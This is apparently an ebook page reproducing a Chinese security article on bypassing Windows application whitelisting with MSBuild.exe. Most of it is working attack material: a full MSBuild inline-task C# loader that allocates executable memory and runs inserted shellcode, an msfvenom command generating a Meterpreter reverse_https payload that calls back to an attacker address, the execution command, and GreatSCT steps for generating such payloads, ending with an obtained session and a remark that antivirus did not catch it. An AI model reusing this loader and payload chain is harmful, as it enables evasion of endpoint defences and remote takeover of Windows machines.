@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>GreatSCT | MSF | 白名单</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>GreatSCT | MSF | 白名单</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MTM4NzYwNw==&amp;mid=2247484138&amp;idx=1&amp;sn=1b39acd6bce010562e516af343ec479a&amp;chksm=ec102352db67aa443dfb8ffbb51db048de8e920f152c1db5052df0c0fcd3edeeffc88e51388f&amp;scene=126&amp;sessionid=1681663691#rd">http://mp.weixin.qq.com/s?__biz=MzI5MTM4NzYwNw==&amp;mid=2247484138&amp;idx=1&amp;sn=1b39acd6bce010562e516af343ec479a&amp;chksm=ec102352db67aa443dfb8ffbb51db048de8e920f152c1db5052df0c0fcd3edeeffc88e51388f&amp;scene=126&amp;sessionid=1681663691#rd</a></blockquote><h2><strong>简介</strong></h2><p><br/></p><p>国外的安全研究员Casey Smith，于2016年9月13日星期二在其博客发表了一篇题为“使用MSBuild.exe绕过应用程序白名单 - 设备保护示例及缓解措施”的文章。但目前其博客已被关闭，如果大家想查看原文可以点击该链接进行查阅：https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html 。以下为我测试当中的截图内容，可以看到某安全防护软件并未对其拦截查杀。</p><p><br/></p><p><img class="size-full wp-image-6099 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolU5LEeqbwyuJc0fSddIZ3wFqXxTibrphf3b4IyPQan1GGlS1CQOhVKvlg/0?wx_fmt=jpeg" width="1590" height="856" data-ratio="0.5383647798742138" data-w="1590" data-type="jpeg" src="../Images/75dcca774dba505a6f3a44da3ca30407.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolU5LEeqbwyuJc0fSddIZ3wFqXxTibrphf3b4IyPQan1GGlS1CQOhVKvlg/0?wx_fmt=jpeg"/></p><h2><strong><br/></strong></h2><h2><strong>POC</strong></h2><pre class="EnlighterJSRAW" data-enlighter-language="shell">&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+         &lt;!-- This inline task executes shellcode. --&gt;
+         &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;
+         &lt;!-- Save This File And Execute The Above Command --&gt;
+         &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;
+         &lt;!-- License: BSD 3-Clause --&gt;
+    &lt;Target Name="Hello"&gt;
+      &lt;ClassExample /&gt;
+    &lt;/Target&gt;
+    &lt;UsingTask
+      TaskName="ClassExample"
+      TaskFactory="CodeTaskFactory"
+      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt;
+      &lt;Task&gt;
+      
+        &lt;Code Type="Class" Language="cs"&gt;
+        &lt;![CDATA[
+    using System;
+    using System.Runtime.InteropServices;
+    using Microsoft.Build.Framework;
+    using Microsoft.Build.Utilities;
+    public class ClassExample :  Task, ITask
+    {         
+      private static UInt32 MEM_COMMIT = 0x1000;          
+      private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
+      [DllImport("kernel32")]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
+      [DllImport("kernel32")]
+        private static extern IntPtr CreateThread(            
+        UInt32 lpThreadAttributes,
+        UInt32 dwStackSize,
+        UInt32 lpStartAddress,
+        IntPtr param,
+        UInt32 dwCreationFlags,
+        ref UInt32 lpThreadId           
+        );
+      [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(           
+        IntPtr hHandle,
+        UInt32 dwMilliseconds
+        );          
+      public override bool Execute()
+      {
+        byte[] shellcode = new byte[] { INSERT_SHELLCODE_HERE };
+          
+          UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+          Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+          IntPtr hThread = IntPtr.Zero;
+          UInt32 threadId = 0;
+          IntPtr pinfo = IntPtr.Zero;
+          hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+          WaitForSingleObject(hThread, 0xFFFFFFFF);
+          return true;
+      } 
+    }     
+        ]]&gt;
+        &lt;/Code&gt;
+      &lt;/Task&gt;
+    &lt;/UsingTask&gt;
+  &lt;/Project&gt;</pre><p> </p><h2><strong>MSF&amp;MSBuild.exe</strong></h2><p><strong><br/></strong></p><p>通过metasploit以下命令生成C# shellcode：</p><pre class="EnlighterJSRAW" data-enlighter-language="shell">msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f csharp</pre><p><img class="size-full wp-image-6090 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUzYxT3icSFnSvblXVwLokib1XOL2tTFMBmkEFQzUa3634LGfxHRhr7zGw/0?wx_fmt=jpeg" width="1512" height="680" data-ratio="0.4497354497354497" data-w="1512" data-type="jpeg" src="../Images/22235e8b7ae2bbe6b6857d148190dabf.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUzYxT3icSFnSvblXVwLokib1XOL2tTFMBmkEFQzUa3634LGfxHRhr7zGw/0?wx_fmt=jpeg"/></p><p><br/></p><p>在msfconsole中启动metasploit监听处理程序，并将“msbuild.exe”xml文件复制到目标系统。我当前的系统环境为Windows 10 Enterprise，命令执行如下：</p><pre class="EnlighterJSRAW" data-enlighter-language="shell">“C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe shellcode.xml”.</pre><p><img class="size-full wp-image-6091 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUINPVxYMz7micerSeo3O9LBYaKKPIicCJzFyRSg9r7AknCRDyunGd0Wag/0?wx_fmt=png" width="739" height="294" data-ratio="0.39783491204330174" data-w="739" data-type="png" src="../Images/779d03d52e87a1942a601ba0be261c7e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUINPVxYMz7micerSeo3O9LBYaKKPIicCJzFyRSg9r7AknCRDyunGd0Wag/0?wx_fmt=png"/></p><p><img class="size-full wp-image-6092 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolU3RpEhETcCtQ2XeOG7ozOicjZWyprHBWmojNkuP85ibibc3wyic8PAl7Oeg/0?wx_fmt=png" width="1198" height="123" data-ratio="0.10267111853088481" data-w="1198" data-type="png" src="../Images/725fbb34336b10856fadc1e770b75d82.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolU3RpEhETcCtQ2XeOG7ozOicjZWyprHBWmojNkuP85ibibc3wyic8PAl7Oeg/0?wx_fmt=png"/></p><h2><strong><br/></strong></h2><h2><strong>自动化生成PAYLOAD</strong></h2><p><br/></p><p>我们将使用GreatSCT来生成一个“msbuild.exe”有效载荷，命令如下：</p><pre class="EnlighterJSRAW" data-enlighter-language="shell">git clone https://github.com/GreatSCT/GreatSCT.git
+cd GreatSCT
+python3 ./gr8sct.py</pre><p>按任意键开始</p><p><img class="size-full wp-image-6093 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUNiaa0bCn4Mf1og2PbBzVdE71xJMvY2ibF5R8IibfXQc0X2gibeicm2xxaDg/0?wx_fmt=png" width="626" height="836" data-ratio="1.3354632587859425" data-w="626" data-type="png" src="../Images/1eed471fa7cf265d3be4006cd65794bf.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUNiaa0bCn4Mf1og2PbBzVdE71xJMvY2ibF5R8IibfXQc0X2gibeicm2xxaDg/0?wx_fmt=png"/></p><p><br/></p><p>选择选项编号“0”并回车：</p><p><br/></p><p><img class="size-full wp-image-6094 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUJk6nicmXEKzqfFziaqSL8ehL0ic4VcAdokNUQQqCPgicYcNoQQj6cWNbug/0?wx_fmt=png" width="634" height="564" data-ratio="0.889589905362776" data-w="634" data-type="png" src="../Images/20ae68f4d15b53dbef1e170f9b7b2a7e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUJk6nicmXEKzqfFziaqSL8ehL0ic4VcAdokNUQQqCPgicYcNoQQj6cWNbug/0?wx_fmt=png"/></p><p><img class="size-full wp-image-6095 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUQghPSU1ib2YA8OK3rZ0jXHZNYDP6gNiaEIcJ1m7hTU3ZWX3eafN3vBtg/0?wx_fmt=png" width="850" height="187" data-ratio="0.22" data-w="850" data-type="png" src="../Images/a3e9f063a04a97bf60441119a712e936.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUQghPSU1ib2YA8OK3rZ0jXHZNYDP6gNiaEIcJ1m7hTU3ZWX3eafN3vBtg/0?wx_fmt=png"/></p><p><br/></p><p>设置IP</p><p><br/></p><p><img class="size-full wp-image-6096 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUuI9OoojWhtTWgUsBr0zvmRjmpJPr8hRxnXQaQmkOr3WzVN5yInDPgw/0?wx_fmt=png" width="809" height="235" data-ratio="0.2904820766378245" data-w="809" data-type="png" src="../Images/9a739f7aff0caed51f1aee743b013824.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolUuI9OoojWhtTWgUsBr0zvmRjmpJPr8hRxnXQaQmkOr3WzVN5yInDPgw/0?wx_fmt=png"/></p><p><br/></p><p>得到会话</p><p><br/></p><p><img class="size-full wp-image-6097 aligncenter" data-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolU3RpEhETcCtQ2XeOG7ozOicjZWyprHBWmojNkuP85ibibc3wyic8PAl7Oeg/0?wx_fmt=png" width="1198" height="123" data-ratio="0.10267111853088481" data-w="1198" data-type="png" src="../Images/725fbb34336b10856fadc1e770b75d82.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHIQKz8CWvcyCHc3wfHiamolU3RpEhETcCtQ2XeOG7ozOicjZWyprHBWmojNkuP85ibibc3wyic8PAl7Oeg/0?wx_fmt=png"/></p><p><strong><br/></strong></p><p><strong>视频演示：</strong></p><p>http://oc78wb8cz.bkt.clouddn.com/GreatSCT.mp4</p><p><strong><br/></strong></p><p><strong>原文链接：</strong>blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/</p>
+        
+</body>
+</html>
